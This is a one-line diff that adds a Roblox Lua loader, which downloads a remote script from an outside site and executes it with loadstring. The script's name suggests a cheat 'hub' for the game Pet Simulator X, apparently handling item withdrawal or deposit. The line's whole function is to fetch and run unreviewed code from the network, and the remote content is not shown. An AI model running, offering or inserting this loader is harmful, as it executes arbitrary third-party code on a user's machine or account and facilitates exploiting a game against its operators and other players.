@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://shub.fun/script/Pet-Simulator-X-Withdraw-Or-Deposit-simpleHub=XowQn23rBzbV.lua"))()
